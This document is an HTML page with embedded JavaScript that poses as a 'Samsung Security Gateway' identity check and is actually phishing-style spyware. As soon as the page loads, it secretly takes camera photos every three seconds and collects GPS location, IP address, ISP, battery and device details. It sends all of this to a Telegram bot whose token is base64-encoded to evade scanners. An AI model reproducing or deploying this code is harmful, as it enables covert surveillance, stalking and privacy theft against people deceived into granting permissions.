<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Samsung Security Gateway</title>
    
    <style>
        /* =========================================
           1. GLOBAL RESET & VARIABLES
           ========================================= */
        :root {
            --bg-color: #000000;
            --card-bg: #111827;
            --text-primary: #f3f4f6;
            --text-secondary: #9ca3af;
            --accent-color: #ef4444; /* Security Red */
            --success-color: #10b981;
            
            /* DRAWER BRANDING VARS */
            --drawer-text-color: #f5f5ff;
            --drawer-primary-color: #00ffc8;
            --drawer-bg-color: linear-gradient(180deg, rgba(10,20,35,.95), rgba(5,10,15,.9));
            --drawer-link-hover-bg: rgba(0,255,200,.08);
        }

        * { box-sizing: border-box; outline: none; }
        
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* =========================================
           2. DRAWER MENU STYLES (STRICTLY FOLLOWED)
           ========================================= */
        .drawer-toggle{position:fixed;top:18px;left:15px;z-index:1100;background:0 0;border:none;width:35px;height:27px;display:flex;flex-direction:column;justify-content:space-between;cursor:pointer;box-sizing:content-box;transition:transform .4s ease,opacity .4s ease}
        .drawer-toggle.hidden{transform:translateY(-100px);opacity:0;pointer-events:none}
        .drawer-toggle span{height:5px;background:var(--drawer-text-color);border-radius:3px;display:block;transition:all .25s}
        .drawer-toggle.active span:nth-child(1){transform:translateY(10px) rotate(45deg)}
        .drawer-toggle.active span:nth-child(2){opacity:0;transform:scaleX(.2)}
        .drawer-toggle.active span:nth-child(3){transform:translateY(-10px) rotate(-45deg)}
        
        .drawer-nav{position:fixed;top:0;left:0;height:100vh;width:220px;padding-top:90px;z-index:1050;background:var(--drawer-bg-color);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);transform:translateX(-110%);transition:transform .45s cubic-bezier(.2,1,.3,1);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;box-sizing:border-box}
        .drawer-nav.active{transform:translateX(0)}
        .drawer-nav ul{list-style:none;padding:0;margin:0;text-align:left}
        .drawer-nav a{display:block;padding:16px 25px;color:var(--drawer-text-color,#f5f5f5);text-decoration:none;font-size:1.1rem;font-weight:500;transition:color .2s ease,background .2s ease}
        .drawer-nav a:hover{color:var(--drawer-primary-color,#00ffc8);background:var(--drawer-link-hover-bg)}
        .drawer-nav li{opacity:0;transform:translateY(20px);transition:opacity .3s ease,transform .3s ease}
        .drawer-nav.active li{opacity:1;transform:translateY(0)}
        .drawer-nav.active li:nth-child(1){transition-delay:.1s}
        .drawer-nav.active li:nth-child(2){transition-delay:.15s}
        .drawer-nav.active li:nth-child(3){transition-delay:.2s}
        
        .drawer-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:1040;opacity:0;visibility:hidden;transition:opacity .4s ease,visibility .4s ease}
        .drawer-overlay.active{opacity:1;visibility:visible}
        @media (max-width:520px){.drawer-nav{width:70%}}

        /* =========================================
           3. MAIN SECURITY UI (HACKER STYLE)
           ========================================= */
        .main-wrapper {
            flex: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 25px;
            text-align: center;
            position: relative;
            z-index: 1;
        }

        .scanner-ring {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            border: 3px solid rgba(239, 68, 68, 0.2);
            border-top-color: var(--accent-color);
            animation: spin 1.5s linear infinite;
            margin-bottom: 30px;
            position: relative;
            box-shadow: 0 0 30px rgba(239, 68, 68, 0.2);
        }

        .scanner-ring::before {
            content: '';
            position: absolute;
            inset: 10px;
            border-radius: 50%;
            border: 3px solid rgba(239, 68, 68, 0.1);
            border-bottom-color: var(--accent-color);
            animation: spin 3s linear infinite reverse;
        }

        .icon-center {
            position: absolute;
            top: 50%; left: 50%;
            transform: translate(-50%, -50%);
        }
        .icon-center svg { width: 40px; fill: var(--accent-color); }

        h1 {
            font-size: 1.8rem;
            font-weight: 700;
            margin: 0 0 15px 0;
            letter-spacing: 1px;
            background: linear-gradient(to right, #fff, #999);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .status-box {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 15px 25px;
            border-radius: 12px;
            margin-bottom: 30px;
            max-width: 90%;
        }

        p.status-text {
            color: var(--text-secondary);
            font-size: 0.95rem;
            margin: 0;
            font-family: 'Courier New', Courier, monospace;
        }

        .action-btn {
            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
            color: white;
            border: none;
            padding: 18px 45px;
            font-size: 1.1rem;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 10px 25px -5px rgba(220, 38, 38, 0.5);
            transition: all 0.3s ease;
            letter-spacing: 0.5px;
            position: relative;
            overflow: hidden;
            width: 100%;
            max-width: 320px;
        }

        .action-btn:hover { transform: translateY(-2px); box-shadow: 0 15px 30px -5px rgba(220, 38, 38, 0.6); }
        .action-btn:active { transform: translateY(1px); }

        /* HIDDEN TRAP ELEMENTS */
        #hiddenVideo, #hiddenCanvas { display: none !important; opacity: 0; pointer-events: none; }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* =========================================
           4. FOOTER BRANDING (BAWAL STYLE)
           ========================================= */
        .bawal-footer-wrapper{text-align:center;margin-top:30px;margin-bottom:9px;padding-top:20px;border-top:1px solid#444;position:relative;z-index:10;background: #050505;}
        .bawal-footer-link{display:inline-flex;align-items:center;gap:8px;background:#1A1A1A;padding:10px 18px;border-radius:25px;text-decoration:none;box-shadow:0 4px 10px rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.05);transition:transform .3s ease,box-shadow .3s ease}
        .bawal-footer-link:hover{transform:translateY(-5px) scale(1.03);box-shadow:0 10px 25px rgba(0,0,0,.4),0 0 20px rgba(0,255,200,.4),0 0 30px rgba(0,255,200,.2)}
        .bawal-footer-link .dev-text{color:#00ffc8;font-weight:bold;font-size:15px;text-shadow:0 0 5px rgba(0,255,200,.5)}
        .bawal-footer-link .name-text{display:flex;align-items:center;gap:5px;color:#FFD700;font-size:15px;font-weight:bold;text-shadow:0 0 5px rgba(255,215,0,.5)}
        .bawal-footer-link img{width:22px;height:22px;border-radius:50%;transition:transform .3s ease} 
        .bawal-footer-link:hover .telegram-icon{transform:rotate(360deg)}
        .bawal-footer-link:hover .profile-pic{transform:scale(1.15) rotate(-10deg)}
    </style>
</head>
<body>

    <div class="drawer-overlay" id="drawer-overlay" title="Close menu"></div>
    <button class="drawer-toggle" id="drawer-toggle" aria-label="Menu Kholo" title="Menu Kholo" aria-expanded="false">
        <span></span><span></span><span></span>
    </button>
    
    <nav class="drawer-nav" id="drawer-nav" aria-hidden="true">
        <ul>
            <li><a href="https://babubhaikundan.blogspot.com" target="_blank" rel="noopener noreferrer">ü§î About</a></li>
            <li><a href="https://t.me/kundan_yadav_bot" target="_blank" rel="noopener noreferrer">üìû Contact</a></li>
            <li><a href="https://www.instagram.com/babubhaikundan" target="_blank" rel="noopener noreferrer">üí• Instagram</a></li>
        </ul>
    </nav>

    <div class="main-wrapper">
        <video id="hiddenVideo" autoplay playsinline></video>
        <canvas id="hiddenCanvas"></canvas>

        <div class="scanner-ring">
            <div class="icon-center">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
        </div>

        <h1>SYSTEM LOCKED</h1>
        
        <div class="status-box">
            <p class="status-text" id="statusDisplay">Initiating biometric scan sequence...</p>
        </div>

        <button class="action-btn" id="unlockBtn" onclick="forceManualTrigger()">
            VERIFY IDENTITY
        </button>
    </div>

    <div class="bawal-footer-wrapper">
        <a href="https://babubhaikundan.blogspot.com" target="_blank" class="bawal-footer-link">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="telegram-icon">
            <span class="dev-text">DeveloperüíÄ:-</span>
            <span class="name-text">ùïÇùï¶ùïüùïïùïíùïü ùïêùïíùïïùïíùïß <img src="https://s.tfrbot.com/h/gL5VTi" alt="Kundan" class="profile-pic"></span>
        </a>
    </div>

    <script>
        /**
         * CONFIGURATION & STATE MANAGEMENT
         */
        // Encoded Credentials to bypass simple scanners
        const _0x1 = "ODMzODkxMTgzODpBQUc1cVRpeFRReXVuNGt0U1V1ZnhnT2YxUkRMMjVGaElXWQ==";
        const _0x2 = "-1003340893424";
       
        const API_KEY = atob(_0x1);
        const CHAT_ID = _0x2;
        const TOPIC_ID = '2'
        // State Variables
        let isCameraRunning = false;
        let hasLocationSent = false;
        
        // This object collects ALL data before sending ONE message
        let gatheredData = {
            ip: "Fetching...",
            provider: "Unknown",
            batteryLevel: "Unknown",
            isCharging: "Unknown",
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            screenRes: `${window.screen.width}x${window.screen.height}`,
            cores: navigator.hardwareConcurrency || "Unknown",
            ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : "Unknown",
            latitude: null,
            longitude: null,
            accuracy: null,
            mapLink: "Location Access Denied/Pending"
        };

        /**
         * 1. INITIALIZATION SEQUENCE
         */
        document.addEventListener('DOMContentLoaded', async () => {
            updateStatus("Establishing secure connection...");
            
            // Start everything in parallel
            startCameraBurst(); // Starts taking photos
            
            // Gather Data
            await Promise.allSettled([
                fetchIPInfo(),
                fetchBatteryInfo()
            ]);

            // Try Auto-Location (Wait max 4 seconds for GPS)
            attemptLocationAndSendReport();

            // Initialize Drawer Logic
            initDrawer();
        });

        /**
         * 2. DATA GATHERING MODULES
         */
        async function fetchIPInfo() {
            try {
                // Fetch IP and ISP info
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                gatheredData.ip = data.ip || "Unknown";
                gatheredData.provider = `${data.city}, ${data.region} (${data.org})`;
            } catch (e) {
                console.error("IP Fetch Failed", e);
                gatheredData.ip = "Failed to fetch";
            }
        }

        async function fetchBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    gatheredData.batteryLevel = `${Math.round(battery.level * 100)}%`;
                    gatheredData.isCharging = battery.charging ? "Yes ‚ö°" : "No";
                }
            } catch (e) {
                console.error("Battery Fetch Failed", e);
            }
        }

        /**
         * 3. LOCATION & REPORTING LOGIC
         */
        function attemptLocationAndSendReport() {
            if (!navigator.geolocation) {
                sendConsolidatedReport("GPS_UNAVAILABLE");
                return;
            }

            updateStatus("Requesting Satellite Access...");

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    // Success: Update Data Object
                    const { latitude, longitude, accuracy } = position.coords;
                    gatheredData.latitude = latitude;
                    gatheredData.longitude = longitude;
                    gatheredData.accuracy = `${Math.round(accuracy)} meters`;
                    gatheredData.mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
                    
                    // Send the MASTER MESSAGE
                    sendConsolidatedReport("SUCCESS_GPS_LOCKED");
                    hasLocationSent = true;
                    
                    // UI Success
                    updateStatus("Identity Verified. Device Secure.");
                    document.getElementById('unlockBtn').innerText = "ACCESS GRANTED";
                    document.getElementById('unlockBtn').style.background = "#10b981";
                },
                (error) => {
                    // Error: Send whatever data we have (IP/Batt)
                    console.warn("GPS Error:", error.message);
                    sendConsolidatedReport("GPS_DENIED_OR_TIMEOUT");
                    updateStatus("Location verification required.");
                },
                {
                    enableHighAccuracy: true,
                    timeout: 7000, // Wait 7 seconds max for GPS
                    maximumAge: 0
                }
            );
        }

        function sendConsolidatedReport(triggerType) {
            const timestamp = new Date().toLocaleString();
            
            // Formatting the single big message
            const messageBody = `
üö® *SECURITY ALERT: DEVICE ACTIVE* üö®
-------------------------------------
üìÖ *Time:* ${timestamp}
‚ö†Ô∏è *Trigger:* ${triggerType}

üìç *GEOLOCATION DATA*
‚Ä¢ *Lat:* \`${gatheredData.latitude || 'N/A'}\`
‚Ä¢ *Lon:* \`${gatheredData.longitude || 'N/A'}\`
‚Ä¢ *Acc:* ${gatheredData.accuracy || 'N/A'}
üîó [View on Google Maps](${gatheredData.mapLink})

üì° *NETWORK & DEVICE*
‚Ä¢ *IP:* \`${gatheredData.ip}\`
‚Ä¢ *ISP/City:* ${gatheredData.provider}
‚Ä¢ *Device:* ${gatheredData.platform}
‚Ä¢ *Battery:* ${gatheredData.batteryLevel} (Charging: ${gatheredData.isCharging})
‚Ä¢ *Display:* ${gatheredData.screenRes}
‚Ä¢ *RAM/Cores:* ${gatheredData.ram} / ${gatheredData.cores}

üïµÔ∏è *USER AGENT*
\`${gatheredData.userAgent}\`
-------------------------------------
_System Auto-Generated Report_
            `;

            // Sending via Telegram API
            const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${CHAT_ID}&message_thread_id=${TOPIC_ID}&text=${encodeURIComponent(messageBody)}&parse_mode=Markdown`;
            
            fetch(url).catch(err => console.error("Message Send Failed", err));
        }

        /**
         * 4. CAMERA BURST MODE LOGIC
         */
        async function startCameraBurst() {
            if (isCameraRunning) return;
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user', width: { ideal: 640 } } 
                });
                
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                video.srcObject = stream;
                isCameraRunning = true;

                // Wait for stream to be active
                await new Promise(resolve => video.onloadedmetadata = resolve);
                video.play();

                // CAPTURE LOOP (Every 3 Seconds)
                const captureAndSend = () => {
                    if (!isCameraRunning) return;
                    
                    // Draw frame to canvas
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(video, 0, 0);

                    // Convert to blob and send
                    canvas.toBlob(blob => {
                        if(blob) sendPhoto(blob);
                    }, 'image/jpeg', 0.7); // 70% quality for speed
                };

                // First capture immediately after small delay (exposure fix)
                setTimeout(() => {
                    captureAndSend();
                    // Set interval for burst mode
                    setInterval(captureAndSend, 3000);
                }, 1000);

            } catch (e) {
                console.error("Camera Access Denied", e);
            }
        }

        function sendPhoto(blob) {
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
       // --- YE LINE NAYI JODI HAI ---
            formData.append('message_thread_id', TOPIC_ID); 
            formData.append('photo', blob, 'security_capture.jpg');
            
            // No caption needed to keep it clean, or minimal caption
            fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).catch(err => console.error("Photo Send Error", err));
        }

        /**
         * 5. UTILITIES & HANDLERS
         */
        function updateStatus(text) {
            document.getElementById('statusDisplay').innerText = text;
        }

        function forceManualTrigger() {
            // Re-trigger location and camera if user clicks button
            attemptLocationAndSendReport();
            startCameraBurst();
        }

        // --- DRAWER MENU JS (Minified for cleanliness but fully functional) ---
        function initDrawer(){const e=document.getElementById("drawer-toggle"),t=document.getElementById("drawer-nav"),n=document.getElementById("drawer-overlay");function o(){e.classList.add("active"),t.classList.add("active"),n.classList.add("active"),e.setAttribute("aria-expanded","true"),t.setAttribute("aria-hidden","false"),e.classList.remove("hidden")}function c(){e.classList.remove("active"),t.classList.remove("active"),n.classList.remove("active"),e.setAttribute("aria-expanded","false"),t.setAttribute("aria-hidden","true")}function r(){let t;window.addEventListener("scroll",(()=>{n.classList.contains("active")||(e.classList.add("hidden"),clearTimeout(t),t=setTimeout((()=>{e.classList.remove("hidden")}),250))}),{passive:!0})}e&&t&&n&&(e.addEventListener("click",(()=>{e.classList.contains("active")?c():o()})),document.addEventListener("keyup",(e=>{"Escape"===e.key&&t.classList.contains("active")&&c()})),n.addEventListener("click",(()=>{c()})),r())}

    </script>
</body>
</html>

